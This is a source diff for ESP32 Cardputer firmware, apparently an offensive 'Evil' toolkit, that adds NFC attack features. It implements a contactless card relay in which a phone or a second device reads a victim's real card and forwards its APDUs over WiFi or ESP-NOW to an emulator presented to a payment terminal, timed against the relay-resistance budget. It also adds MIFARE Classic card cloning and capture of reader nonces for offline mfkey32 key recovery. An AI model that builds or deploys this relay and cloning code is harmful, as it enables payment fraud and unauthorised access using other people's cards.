+    if (p == 1) {                        // DESFire-ish: 16-byte blob + 91 00 (OK)
+        for (int i = 0; i < 16; i++) out[i] = 0xD0 + (i & 0x0F);
+        out[16] = 0x91; out[17] = 0x00; return 18;
+    }
+    if (p == 2) return emv_full_response(apdu, alen, out);   // EMV Visa: full synthetic transaction
+    if (p == 3) {                        // BigBlob 512B: ESP-NOW fragmentation + ISO-DEP chaining
+        for (int i = 0; i < 510; i++) out[i] = (uint8_t)(i & 0xFF);
+        out[510] = 0x90; out[511] = 0x00; return 512;
+    }
+    out[0] = 0xCA; out[1] = 0xFE; out[2] = 0x90; out[3] = 0x00; return 4; // Mifare fallback marker
+}
+
+// ---- Log relais côté B (émulateur) : bufferisé en RAM, flush SD À LA SORTIE seulement ----
+// ZÉRO écriture SD pendant la transaction (une écriture SD ~10-40ms ruinerait le budget de
+// temps du terminal). Pendant les APDU on ne fait que des append RAM (µs). Le flush /evil/
+// relay_log.txt se fait quand on quitte le rôle (BACK). Fonctions non-static (bug arduino-builder).
+static char* g_rlog = nullptr;
+static int   g_rlog_len = 0;
+static const int G_RLOG_CAP = 48000;
+void rlog_begin() {
+    if (!g_rlog) g_rlog = (char*)malloc(G_RLOG_CAP);
+    g_rlog_len = 0;
+    if (g_rlog) g_rlog_len = snprintf(g_rlog, G_RLOG_CAP, "\n===== relay session t0=%lums =====\n", millis());
+}
+void rlog(const char* fmt, ...) {
+    if (!g_rlog || g_rlog_len >= G_RLOG_CAP - 300) return;
+    int avail = G_RLOG_CAP - g_rlog_len;
+    va_list ap; va_start(ap, fmt);
+    int n = vsnprintf(g_rlog + g_rlog_len, avail, fmt, ap);
+    va_end(ap);
+    if (n < 0) n = 0;
+    if (n >= avail) n = avail - 1;   // tronqué -> ne compter que ce qui a ete ecrit
+    g_rlog_len += n;
+}
+void rlog_hex(const uint8_t* b, int len) {
+    if (!g_rlog) return;
+    for (int i = 0; i < len && g_rlog_len < G_RLOG_CAP - 4; i++)
+        g_rlog_len += snprintf(g_rlog + g_rlog_len, G_RLOG_CAP - g_rlog_len, "%02X", b[i]);
+}
+void rlog_flush_sd() {
+    if (!g_rlog || g_rlog_len <= 0) return;
+    if (!SD.exists("/evil")) SD.mkdir("/evil");
+    File f = SD.open("/evil/relay_log.txt", FILE_APPEND);
+    if (f) { f.write((const uint8_t*)g_rlog, g_rlog_len); f.close(); }
+    g_rlog_len = 0;
+}
+
+// Service one reader I-block: reassemble a reader-CHAINED command (ACK each fragment), relay the full
+// APDU to A over ESP-NOW (S(WTX) keep-alive while waiting), then send the card's response back to the
+// reader (chained if it exceeds the reader FSD). Records round-trip latency for the RRP budget check.
+void relay_service_iblock(uint8_t* frame, int fn, uint8_t* seq, int* relayed, int* wtx_sent) {
+    uint8_t cmd[600]; int clen = 0;
+    uint8_t lpcb = frame[0]; int cn = fn;
+    while (true) {                                   // reader-side chaining reception
+        int off = 1; if (lpcb & 0x08) off++; if (lpcb & 0x04) off++;
+        // Le FIFO du ST25R3916 garde le CRC (2 octets) en fin de trame : le retirer,
+        // sinon l'APDU relaye a la carte est 2 octets trop long -> la carte repond 6700.
+        int plen = cn - off - 2; if (plen < 0) plen = 0;
+        if (clen + plen <= (int)sizeof(cmd)) { memcpy(cmd + clen, frame + off, plen); clen += plen; }
+        if (!(lpcb & 0x10)) break;                   // M=0 -> command complete
+        uint8_t rack = 0xA2 | (lpcb & 0x01);         // R(ACK) this fragment
+        nfc_emul_tx(&rack, 1);
+        uint8_t irq = 0; cn = nfc_emul_poll(frame, 320, 500, &irq);
+        if (cn < 1) return;                          // chaining broke
+        lpcb = frame[0];
+    }
+    uint8_t last_bn = lpcb & 0x01;
+    int cid = (lpcb & 0x08) ? frame[1] : -1;
+    (*seq)++; rly_resp_ready = false;
+    rly_send(RLY_T_REQ, *seq, cmd, clen);
+    unsigned long tt = millis(), wtxt = tt; bool have = false;
+    while (millis() - tt < 5000) {
+        if (rly_resp_ready && rly_resp_seq == *seq) { have = true; break; }
+        if (millis() - wtxt > 40) {                  // keep reader alive during A round-trip
+            uint8_t w[2] = {0xF2, 0x0A}; nfc_emul_tx(w, 2); if (wtx_sent) (*wtx_sent)++;
+            uint8_t tmp[64]; uint8_t i2 = 0; nfc_emul_poll(tmp, sizeof(tmp), 50, &i2);
+            wtxt = millis();
+        }
+        delay(1);
+    }
+    unsigned long rtt = millis() - tt;               // latency instrumentation (vs RRP budget)
+    g_last_rtt = rtt; if (rtt > g_max_rtt) g_max_rtt = rtt; g_sum_rtt += rtt; g_rtt_n++;
+    if (have) nfc_emul_tx_isodep(rly_resp, rly_resp_len, last_bn, cid);
+    else { uint8_t sw[2] = {0x6F, 0x00}; nfc_emul_tx_isodep(sw, 2, last_bn, cid); }
+    if (relayed) (*relayed)++;
+    if (RLY_DEBUG) Serial.printf("[RLY] cmd=%dB resp=%dB rtt=%lums max=%lums\n", clen, have ? rly_resp_len : 2, rtt, g_max_rtt);
+    // Log RAM (flush SD a la sortie) : APDU du terminal + reponse carte + latence
+    rlog("[%lu] REQ(%d) ", millis(), clen); rlog_hex(cmd, clen);
+    if (have) { rlog(" -> RESP(%d) ", rly_resp_len); rlog_hex(rly_resp, rly_resp_len); }
+    else      { rlog(" -> RESP 6F00 (timeout A)"); }
+    rlog(" | rtt=%lums\n", rtt);
+}
+
+// ================= Serial-driven relay launchers (for headless testing over USB) =================
+// Let a host drive the two Cardputers without touching the keyboard:
+//   relayb        -> this unit becomes Relay Emul B (needs Cap NFC HAT), waits IDENT from A
+//   vcard <n>     -> this unit becomes VirtCard A on profile n (0..3), no HAT needed
+//   relaystop     -> stop the running relay/vcard loop
+
+void serial_relay_B() {
+    if (!nfc_open()) { Serial.println("[SER] relayB: no Cap NFC HAT"); return; }
+    if (!rly_begin()) { Serial.println("[SER] relayB: ESP-NOW init fail"); nfc_close(); return; }
+    Serial.println("[SER] relayB: waiting IDENT from A...");
+    unsigned long t0 = millis();
+    while (!rly_ident_ready && !g_relay_stop) {
+        M5.update(); cardUpdate(); delay(10);
+        if (millis() - t0 > 60000) { Serial.println("[SER] relayB: IDENT timeout"); rly_end(); nfc_close(); return; }
+    }
+    if (g_relay_stop) { rly_end(); nfc_close(); return; }
+    nfc_emul_start(rly_uid, rly_uid_len, rly_atqa, rly_sak);
+    uint8_t ats_use[64]; int ats_use_len = nfc_build_emul_ats(ats_use);
+    uint8_t cur_uid[10]; uint8_t cur_ulen = rly_uid_len; memcpy(cur_uid, rly_uid, rly_uid_len);
+    Serial.printf("[SER] relayB: armed, uid_len=%d sak=%02X ats=%dB\n", rly_uid_len, rly_sak, ats_use_len);
+    uint8_t frame[320]; uint8_t seq = 0; int relayed = 0;
+    while (!g_relay_stop) {
+        if (rly_ident_ready && (rly_uid_len != cur_ulen || memcmp(rly_uid, cur_uid, rly_uid_len) != 0)) {
+            cur_ulen = rly_uid_len; memcpy(cur_uid, rly_uid, rly_uid_len);
+            nfc_emul_start(rly_uid, rly_uid_len, rly_atqa, rly_sak);
+            ats_use_len = nfc_build_emul_ats(ats_use);
+            Serial.println("[SER] relayB: re-armed (identity changed)");
+        }
+        uint8_t irq = 0; int n = nfc_emul_poll(frame, sizeof(frame), 100, &irq);
+        if (n > 0) {
+            uint8_t pcb = frame[0];
+            if (pcb == 0xE0) { g_reader_fsd = fsd_from_fsdi(n >= 2 ? (frame[1] >> 4) : 8); nfc_emul_tx(ats_use, ats_use_len); Serial.printf("[SER] relayB: RATS fsd=%d\n", g_reader_fsd); }
+            else if (pcb == 0xC2) { uint8_t d = 0xC2; nfc_emul_tx(&d, 1); }
+            else if ((pcb & 0xE2) == 0x02) {   // I-block: reader-chaining + relay + response-chaining + latency
+                relay_service_iblock(frame, n, &seq, &relayed, nullptr);
+            }
+        }
+        M5.update(); cardUpdate();
+    }
+    nfc_emul_stop(); rly_end(); nfc_close();
+    Serial.println("[SER] relayB: stopped");
+}
+
+void serial_vcard_A(int prof) {
+    if (!rly_begin()) { Serial.println("[SER] vcardA: ESP-NOW init fail"); return; }
+    uint8_t ident[80]; int ii = vcard_ident(prof, ident);
+    Serial.printf("[SER] vcardA: profile=%s\n", vcard_name(prof));
+    unsigned long last_ident = 0; int served = 0;
+    while (!g_relay_stop) {
+        if (millis() - last_ident > 400) { rly_send(RLY_T_IDENT, 0, ident, ii); last_ident = millis(); }
+        if (rly_req_ready) {
+            uint8_t sq = rly_req_seq; rly_req_ready = false;
+            uint8_t resp[600]; int rlen = vcard_response(prof, rly_req, rly_req_len, resp);
+            rly_send(RLY_T_RESP, sq, resp, rlen); served++;
+            Serial.printf("[SER] vcardA: req=%d -> resp=%d (served %d)\n", rly_req_len, rlen, served);
+        }
+        M5.update(); cardUpdate(); delay(2);
+    }
+    rly_end();
+    Serial.println("[SER] vcardA: stopped");
+}
+
+// Ultralight/NTAG toolkit — additive; included here so nfc_transceive()/
+// nfc_activate()/NfcCardInfo are already defined above.
+#include "src/nfc_ultralight.h"
+#include "src/nfc_iso15693_felica.h"   // ISO15693/FeliCa/ISO-B pollers (additive, restores ISO-A)
+// Phase 5 : DESFire (énumération + auth DES/3DES/AES) — réutilise le
+// transport ISO-DEP défini plus haut (nfc_transceive_apdu).
+#include "src/nfc_desfire.h"
+
+// ── Emulate MIFARE Classic (Phase 2b) ──
+// Two modes selected automatically:
+//   * If /evil/mfemul.bin (a 1K dump) exists -> FULL EMULATION of that card
+//     (Crypto1 auth + encrypted READ/WRITE served from the dump).  [best effort,
+//     validate FDT timing on hardware against a real reader]
+//   * Otherwise -> DETECT-READER capture: clone a presented card's identity, and
+//     record the reader's encrypted {nr,ar} nonces for offline mfkey32 recovery,
+//     appending to /evil/mfkey_nonces.txt.  [robust]
+// NFC is assumed already open (called from nfcMenu). Additive, no existing path
+// is modified.
+void nfc_mfemul_ui() {
+    const int W = 240, H = 135;
+    M5Canvas* spr = new(std::nothrow) M5Canvas(&M5.Display);
+    bool us = false;
+    if (spr) { spr->setColorDepth(8); us = spr->createSprite(W, H); }
+    auto& sp = us ? (LovyanGFX&)*spr : (LovyanGFX&)M5.Display;
+
+    bool fullEmul = mfe_load_dump_bin("/evil/mfemul.bin");
+    NfcCardInfo card = {};
+
+    if (fullEmul) {
+        // Emulate the saved dump's identity directly (no card to present).
+        card.uid_len = 4;
+        memcpy(card.uid, g_mfe_dump.uid, 4);
+        card.atqa = g_mfe_dump.atqa; card.sak = g_mfe_dump.sak; card.valid = true;
+        Serial.printf("[MFE] FULL emul from /evil/mfemul.bin UID %02X%02X%02X%02X\n",
+                      card.uid[0], card.uid[1], card.uid[2], card.uid[3]);
+    } else {
+        // Capture mode: clone the identity of a presented card first.
+        sp.fillScreen(TFT_BLACK);
+        sp.fillRect(0, 0, W, 14, 0x0841);
+        sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Emul MIFARE (mfkey)");
+        sp.setTextColor(TFT_YELLOW, TFT_BLACK); sp.setCursor(14, 50); sp.print("Place card to CLONE...");
+        sp.setTextColor(0x8410, TFT_BLACK); sp.setCursor(10, 72); sp.print("(no /evil/mfemul.bin");
+        sp.setCursor(10, 84); sp.print(" -> capture mode)");
+        sp.fillRect(0, H-14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=cancel");
+        if (us) spr->pushSprite(0, 0);
+
+        bool cancelled = false;
+        while (!card.valid) {
+            M5.update(); cardUpdate();
+            if (kp(KEY_BACKSPACE)) { keyRelease(); cancelled = true; break; }
+            card = nfc_activate();
+            if (!card.valid) delay(150);
+        }
+        if (cancelled) { if (spr) { spr->deleteSprite(); delete spr; } return; }
+
+        // Seed g_mfe_dump.uid (used for cuid) with the first 4 UID bytes.
+        memcpy(g_mfe_dump.uid, card.uid, 4);
+        g_mfe_dump.sak = card.sak; g_mfe_dump.atqa = card.atqa; g_mfe_dump.loaded = false;
+        Serial.printf("[MFE] Emulating UID %02X%02X%02X%02X ATQA %04X SAK %02X — capturing reader nonces\n",
+                      card.uid[0], card.uid[1], card.uid[2], card.uid[3], card.atqa, card.sak);
+    }
+
+    mfe_begin(card.uid, card.uid_len, card.atqa, card.sak);
+
+    int saved = 0, nAuth = 0, nRead = 0, nWrite = 0;
+    bool run = true;
+    unsigned long lastDraw = 0;
+    while (run) {
+        int ev = mfe_service_once(fullEmul ? &g_mfe_dump : NULL, /*capture_only=*/!fullEmul);
+        if (ev == MFE_EV_AUTHOK) nAuth++;
+        else if (ev == MFE_EV_READ) nRead++;
+        else if (ev == MFE_EV_WRITE) nWrite++;
+
+        // Persist any newly captured nonce(s).
+        while (saved < g_mfe_ncount) {
+            MfeNonce& e = g_mfe_nonces[saved];
+            char line[128];
+            snprintf(line, sizeof(line),
+                     "cuid=%08X blk=%d key=%c nt=%08X nr=%08X ar=%08X\n",
+                     e.uid, e.block, (e.keytype == 0x60 ? 'A' : 'B'), e.nt, e.nr, e.ar);
+            Serial.print("[MFE] "); Serial.print(line);
+            File nf = SD.open("/evil/mfkey_nonces.txt", FILE_APPEND);
+            if (nf) { nf.print(line); nf.close(); }
+            saved++;
+        }
+
+        if (ev != MFE_EV_IDLE || millis() - lastDraw > 250) {
+            lastDraw = millis();
+            sp.fillScreen(TFT_BLACK);
+            sp.fillRect(0, 0, W, 14, 0x0841);
+            sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3);
+            sp.print(fullEmul ? "Emul MIFARE (full)" : "Emul MIFARE (mfkey)");
+            sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(4, 20); sp.print("UID ");
+            for (int i = 0; i < card.uid_len; i++) sp.printf("%02X", card.uid[i]);
+            sp.setTextColor(TFT_WHITE, TFT_BLACK); sp.setCursor(4, 34);
+            sp.printf("ATQA %04X SAK %02X", card.atqa, card.sak);
+            if (fullEmul) {
+                sp.setTextColor(TFT_CYAN, TFT_BLACK); sp.setCursor(4, 54);
+                sp.printf("Auth OK : %d", nAuth);
+                sp.setTextColor(TFT_YELLOW, TFT_BLACK); sp.setCursor(4, 72);
+                sp.printf("Reads   : %d", nRead);
+                sp.setCursor(4, 90); sp.printf("Writes  : %d", nWrite);
+                sp.setTextColor(0x8410, TFT_BLACK); sp.setCursor(4, 110);
+                sp.printf("nonces %d (mfkey too)", g_mfe_ncount);
+            } else {
+                sp.setTextColor(TFT_CYAN, TFT_BLACK); sp.setCursor(4, 52);
+                sp.printf("Nonces captured: %d", g_mfe_ncount);
+                if (g_mfe_ncount > 0) {
+                    MfeNonce& e = g_mfe_nonces[g_mfe_ncount - 1];
+                    sp.setTextColor(TFT_YELLOW, TFT_BLACK);
+                    sp.setCursor(4, 70);  sp.printf("blk %d key%c", e.block, (e.keytype==0x60?'A':'B'));
+                    sp.setCursor(4, 84);  sp.printf("nt %08X", e.nt);
+                    sp.setCursor(4, 98);  sp.printf("nr %08X", e.nr);
+                    sp.setCursor(4, 112); sp.printf("ar %08X", e.ar);
+                } else {
+                    sp.setTextColor(0x8410, TFT_BLACK); sp.setCursor(4, 74);
+                    sp.print("Present to a reader...");
+                }
+            }
+            sp.fillRect(0, H-14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841);
+            sp.setCursor(4, H-12); sp.print(fullEmul ? "BACK=stop  (full emul)" : "BACK=stop ->mfkey_nonces.txt");
+            if (us) spr->pushSprite(0, 0);
+        }
+        M5.update(); cardUpdate();
+        if (kp(KEY_BACKSPACE)) { keyRelease(); run = false; }
+    }
+    mfe_end();
+    Serial.printf("[MFE] Stopped. %d nonce(s) captured this session.\n", g_mfe_ncount);
+    if (spr) { spr->deleteSprite(); delete spr; }
+}
+
+// ── Flipper ".nfc" file interop (Version 4) ─────────────────────────────────
+// Helpers live in headers so arduino-builder doesn't emit broken prototypes.
+#include "src/nfc_flipper_fmt.h"
+#include "src/nfc_flipper_dev.h"
+
 void nfcMenu() {
     keyRelease();
     const int W = 240, H = 135;
@@ -45036,9 +48943,52 @@ void nfcMenu() {
     M5.Display.setCursor(10, 50); M5.Display.print("Opening Cap NFC...");
     M5.Display.display();
     if (!nfc_open()) {
-        M5.Display.setCursor(10, 70); M5.Display.setTextColor(TFT_RED, TFT_BLACK);
-        M5.Display.print("Cap NFC not found! Check Cap HAT");
-        M5.Display.display(); delay(2000); inMenu = true; return;
+        // No Cap NFC HAT: the only HAT-less relay role is Virtual Card A (ESP-NOW test shim for jalon 3).
+        M5Canvas vcs(&M5.Display); vcs.setColorDepth(8); bool vc_ok = vcs.createSprite(240, 135);
+        auto& d = vc_ok ? (LovyanGFX&)vcs : (LovyanGFX&)M5.Display;   // double-buffer -> no flicker
+        d.fillScreen(TFT_BLACK); d.setTextSize(1); d.setTextFont(1);
+        d.setCursor(6, 20); d.setTextColor(TFT_ORANGE, TFT_BLACK); d.print("No Cap NFC HAT");
+        d.setCursor(6, 40); d.setTextColor(TFT_WHITE, TFT_BLACK); d.print("VirtCard A (ESP-NOW)");
+        d.setCursor(6, 64); d.setTextColor(TFT_GREEN, TFT_BLACK); d.print("ENT=start  BACK=exit");
+        if (vc_ok) vcs.pushSprite(0, 0);
+        bool go = false;
+        while (true) { M5.update(); cardUpdate(); if (kp(KEY_ENTER)) { keyRelease(); go = true; break; } if (kp(KEY_BACKSPACE)) { keyRelease(); break; } delay(10); }
+        if (go && rly_begin()) {
+            int vprof = 0;
+            uint8_t ident[80]; int ii = vcard_ident(vprof, ident);
+            unsigned long last_ident = 0; int served = 0; char lastreq[3*16+1] = {0}; bool run = true;
+            int drawn = -1, drawn_prof = -1;
+            while (run) {
+                if (millis() - last_ident > 400) { rly_send(RLY_T_IDENT, 0, ident, ii); last_ident = millis(); }
+                if (rly_req_ready) {
+                    uint8_t seq = rly_req_seq; int pp = 0;
+                    for (int i = 0; i < rly_req_len && i < 16; i++) pp += snprintf(lastreq+pp, sizeof(lastreq)-pp, "%02X ", rly_req[i]);
+                    rly_req_ready = false;
+                    uint8_t resp[600]; int rlen = vcard_response(vprof, rly_req, rly_req_len, resp);
+                    rly_send(RLY_T_RESP, seq, resp, rlen); served++;
+                    Serial.printf("[VCARD] %s REQ len=%d -> resp %d\n", vcard_name(vprof), rly_req_len, rlen);
+                }
+                if (kp('.')) { keyRelease(); vprof = (vprof + 1) % VC_NPROF; ii = vcard_ident(vprof, ident); last_ident = 0; served = 0; lastreq[0] = 0; drawn = -2; delay(120); }
+                if (served != drawn || vprof != drawn_prof) {   // redraw on change
+                    drawn = served; drawn_prof = vprof;
+                    d.fillScreen(TFT_BLACK);
+                    d.setCursor(6, 6);  d.setTextColor(TFT_ORANGE, TFT_BLACK); d.print("VirtCard A (noHAT)");
+                    d.setCursor(6, 24); d.setTextColor(TFT_YELLOW, TFT_BLACK); d.printf("Profile: %s", vcard_name(vprof));
+                    d.setCursor(6, 42); d.setTextColor(TFT_GREEN, TFT_BLACK);  d.print(".=next profile");
+                    d.setCursor(6, 60); d.setTextColor(TFT_WHITE, TFT_BLACK);  d.printf("APDUs served: %d", served);
+                    d.setCursor(6, 78); d.setTextColor(TFT_CYAN, TFT_BLACK);   d.print("Last REQ:");
+                    d.setCursor(6, 92); d.print(lastreq[0] ? lastreq : "(waiting B)");
+                    d.setCursor(6, 118); d.setTextColor(0x5AEB, TFT_BLACK);    d.print("BACK=stop");
+                    if (vc_ok) vcs.pushSprite(0, 0);
+                }
+                M5.update(); cardUpdate();
+                if (kp(KEY_BACKSPACE)) { keyRelease(); run = false; }
+                delay(2);
+            }
+            rly_end();
+            if (vc_ok) vcs.deleteSprite();
+        }
+        inMenu = true; return;
     }
 
     M5Canvas* sprite = new(std::nothrow) M5Canvas(&M5.Display);
@@ -45046,8 +48996,8 @@ void nfcMenu() {
     if (sprite) { sprite->setColorDepth(8); use_sprite = sprite->createSprite(W, H); }
     auto& sp = use_sprite ? (LovyanGFX&)*sprite : (LovyanGFX&)M5.Display;
 
-    const char* items[] = {"Read Tag", "Saved Tags", "EMV Reader", "Write NDEF", "Write Clone", "Write UID"};
-    const int nfc_item_count = 6;
+    const char* items[] = {"Read Tag", "Saved Tags", "EMV Reader", "Write NDEF", "Write Clone", "Write UID", "Relay/Emul", "Ultralight/NTAG", "ISO-V/F/B Scan", "DESFire", "mfkey (MIFARE)"};
+    const int nfc_item_count = 11;
     const int nfc_lineH = 16;
     const int nfc_listY = 18;
     const int nfc_maxVis = (H - nfc_listY - 14) / nfc_lineH;
@@ -45130,12 +49080,13 @@ void nfcMenu() {
                 // For Ultralight/NTAG: read pages and parse NDEF
                 char ndef_content[128] = {};
                 int ndef_type = 0; // 0=none, 1=URL, 2=Text
+                uint8_t ul_pages[64 * 4] = {};   // hoisted so .nfc export can reuse
+                int ul_pages_read = 0;
                 if (card.sak == 0x00) {
-                    uint8_t ul_pages[64 * 4] = {};
-                    int pages_read = nfc_ul_read_pages(ul_pages, 64);
-                    if (pages_read >= 5) {
-                        ndef_type = nfc_parse_ndef(ul_pages, pages_read, ndef_content, sizeof(ndef_content) - 1);
-                        Serial.printf("[NFC] NDEF: type=%d content='%s' pages=%d\n", ndef_type, ndef_content, pages_read);
+                    ul_pages_read = nfc_ul_read_pages(ul_pages, 64);
+                    if (ul_pages_read >= 5) {
+                        ndef_type = nfc_parse_ndef(ul_pages, ul_pages_read, ndef_content, sizeof(ndef_content) - 1);
+                        Serial.printf("[NFC] NDEF: type=%d content='%s' pages=%d\n", ndef_type, ndef_content, ul_pages_read);
                     }
                 }
 
@@ -45156,6 +49107,7 @@ void nfcMenu() {
 
                 // Analysis screen
                 while (true) {
+                    read_analysis_redraw:;
                     sp.fillScreen(TFT_BLACK);
                     sp.fillRect(0, 0, W, 14, 0x0841);
                     sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Tag Found!");
@@ -45190,7 +49142,7 @@ void nfcMenu() {
 
                     sp.setTextColor(TFT_CYAN, TFT_BLACK);
                     int y_opt = (is_classic || ndef_type > 0) ? 98 : 70;
-                    sp.setCursor(10, y_opt); sp.print("ENTER = Save");
+                    sp.setCursor(10, y_opt); sp.print("ENTER=Save  F=.nfc(Flipper)");
                     sp.setCursor(10, y_opt + 12); sp.print("E = Emulate  BACK = Rescan");
 
                     sp.fillRect(0, H-14, W, 14, 0x0841);
@@ -45272,6 +49224,24 @@ void nfcMenu() {
                             nfc_close(); nfc_open();
                             goto read_scan_again;
                         }
+                        if (kp('f') || kp('F')) {
+                            keyRelease();
+                            // Export to Flipper .nfc (release NFC before SD access — shared SPI)
+                            nfc_cmd(NFC_CMD_STOP_ALL);
+                            digitalWrite(NFC_CS, HIGH);
+                            delay(2);
+                            char nfc_path[80];
+                            bool ok = nfc_export_flipper(card, mf_blocks, mf_total_blocks,
+                                                         (card.sak == 0x00) ? ul_pages : nullptr, ul_pages_read,
+                                                         nfc_path, sizeof(nfc_path));
+                            sp.fillScreen(TFT_BLACK);
+                            sp.setTextColor(ok ? TFT_GREEN : TFT_RED, TFT_BLACK);
+                            sp.setCursor(10, 45); sp.print(ok ? "Saved .nfc (Flipper)" : ".nfc export failed");
+                            if (ok) { sp.setTextColor(TFT_CYAN, TFT_BLACK); sp.setCursor(10, 62); sp.print(nfc_path); }
+                            if (use_sprite) sprite->pushSprite(0, 0);
+                            delay(1500);
+                            goto read_analysis_redraw; // stay on analysis screen
+                        }
                         delay(10);
                     }
                     break;
@@ -45279,9 +49249,9 @@ void nfcMenu() {
                 read_scan_again:;
             }
             read_done:;
+        }
 
         // ── Mode 2: Saved Tags ──
-        }
         if (mode == 2) {
             File dir = SD.open("/evil/nfc");
             String files[20]; int file_count = 0;
@@ -46392,6 +50362,829 @@ void nfcMenu() {
                     }
                 }
             }
+        }
+
+            // ── Mode 7: Card Emulation / Relay (jalons 1-3) ──
+        if (mode == 7) {
+            // ── Choix de la liaison de relais : Dual (2 Cardputer/ESP-NOW) ou APK (telephone/WiFi) ──
+            int conn = -1; { int cs = 0; bool cd = true; const char* citems[] = { "APK (WiFi phone)", "Dual (2 Cardputer)" };
+                while (conn < 0) {
+                    if (cd) {
+                        sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841);
+                        sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Relay - liaison");
+                        for (int i = 0; i < 2; i++) { sp.setTextColor(i == cs ? TFT_GREEN : TFT_WHITE, TFT_BLACK); sp.setCursor(10, 28 + i * 18); sp.print(i == cs ? "> " : "  "); sp.print(citems[i]); }
+                        sp.setTextColor(0x5AEB, TFT_BLACK); sp.setCursor(6, 74); sp.print("APK: phone reads card (WiFi)");
+                        sp.setCursor(6, 88); sp.print("Dual: 2nd Cardputer+HAT");
+                        sp.fillRect(0, H - 14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12); sp.print(";/. ENT BACK");
+                        if (use_sprite) sprite->pushSprite(0, 0); cd = false;
+                    }
+                    M5.update(); cardUpdate();
+                    if (kp(KEY_BACKSPACE)) { keyRelease(); conn = -2; break; }
+                    if (kp(';')) { cs = (cs + 1) % 2; cd = true; delay(150); }
+                    if (kp('.')) { cs = (cs + 1) % 2; cd = true; delay(150); }
+                    if (kp(KEY_ENTER)) { conn = (cs == 0) ? 1 : 0; keyRelease(); }   // idx0=APK(conn1), idx1=Dual(conn0)
+                    delay(10);
+                }
+            }
+            if (conn == 1) {
+                // ===== APK : Relay Emul (B) via WiFi + telephone (lecteur NFC) =====
+                // Le Cardputer = SoftAP + serveur TCP + emule vers le TPE ; le telephone lit la vraie
+                // carte et relaie les APDU par WiFi. Reutilise nfc_emul_start + relay_service_iblock.
+                WiFi.mode(WIFI_AP); WiFi.softAP("EvilRelay", "evilrelay1234");
+                IPAddress apip = WiFi.softAPIP();
+                WiFiServer server(5566); server.begin();
+                bool cancelled = false; uint32_t wd = 0;
+                while (!rly_tcp.connected()) {
+                    WiFiClient c = server.available();
+                    if (c) { rly_tcp = c; rly_tcp.setNoDelay(true); break; }
+                    M5.update(); cardUpdate();
+                    if (kp(KEY_BACKSPACE)) { keyRelease(); cancelled = true; break; }
+                    if (millis() - wd > 300) { wd = millis();
+                        sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841); sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Relay Emul (APK)");
+                        sp.setTextColor(TFT_YELLOW, TFT_BLACK); sp.setCursor(6, 24); sp.print("AP: EvilRelay");
+                        sp.setCursor(6, 38); sp.print("pass: evilrelay1234");
+                        sp.setTextColor(TFT_WHITE, TFT_BLACK); sp.setCursor(6, 54); sp.printf("%s : 5566", apip.toString().c_str());
+                        sp.setTextColor(0x5AEB, TFT_BLACK); sp.setCursor(6, 76); sp.print("Attente telephone (APK)...");
+                        sp.fillRect(0, H - 14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12); sp.print("BACK=stop");
+                        if (use_sprite) sprite->pushSprite(0, 0);
+                    }
+                    delay(10);
+                }
+                if (!cancelled) {
+                    rly_transport = 1; rly_ident_ready = rly_req_ready = rly_resp_ready = false;
+                    wifi_rx_run = true;
+                    xTaskCreatePinnedToCore(wifi_rx_task, "wifirx", 4096, NULL, 1, NULL, 0);
+                    uint32_t wd2 = 0;
+                    while (!rly_ident_ready && rly_tcp.connected() && !cancelled) {
+                        M5.update(); cardUpdate();
+                        if (kp(KEY_BACKSPACE)) { keyRelease(); cancelled = true; break; }
+                        if (millis() - wd2 > 300) { wd2 = millis();
+                            sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841); sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Relay Emul (APK)");
+                            sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(6, 30); sp.print("Telephone connecte");
+                            sp.setTextColor(TFT_YELLOW, TFT_BLACK); sp.setCursor(6, 50); sp.print("Pose une carte sur le tel");
+                            sp.fillRect(0, H - 14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12); sp.print("BACK=stop");
+                            if (use_sprite) sprite->pushSprite(0, 0);
+                        }
+                        delay(10);
+                    }
+                    if (!cancelled && rly_ident_ready) {
+                        nfc_emul_start(rly_uid, rly_uid_len, rly_atqa, rly_sak);
+                        rlog_begin();
+                        uint8_t ats_use[64]; int ats_use_len = nfc_build_emul_ats(ats_use);
+                        uint8_t frame[320]; uint8_t seq = 0; int relayed = 0, wtx_sent = 0; uint8_t tgt_irq = 0;
+                        bool run = true; uint32_t lastDraw = 0;
+                        while (run) {
+                            uint8_t irq = 0; int n = nfc_emul_poll(frame, sizeof(frame), 100, &irq); tgt_irq |= irq;
+                            if (n > 0) {
+                                uint8_t pcb = frame[0];
+                                if (pcb == 0xE0) { g_reader_fsd = fsd_from_fsdi(n >= 2 ? (frame[1] >> 4) : 8); nfc_emul_tx(ats_use, ats_use_len); }
+                                else if (pcb == 0xC2) { uint8_t d = 0xC2; nfc_emul_tx(&d, 1); seq = 0; nfc_emul_start(rly_uid, rly_uid_len, rly_atqa, rly_sak); }  // DESELECT -> re-arme pour le tap suivant
+                                else if ((pcb & 0xE2) == 0x02) { relay_service_iblock(frame, n, &seq, &relayed, &wtx_sent); }
+                            }
+                            if (millis() - lastDraw > 200) { lastDraw = millis();
+                                sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841); sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Relay Emul (APK)");
+                                sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(4, 20); sp.print("Emul UID: "); for (int i = 0; i < rly_uid_len; i++) sp.printf("%02X", rly_uid[i]);
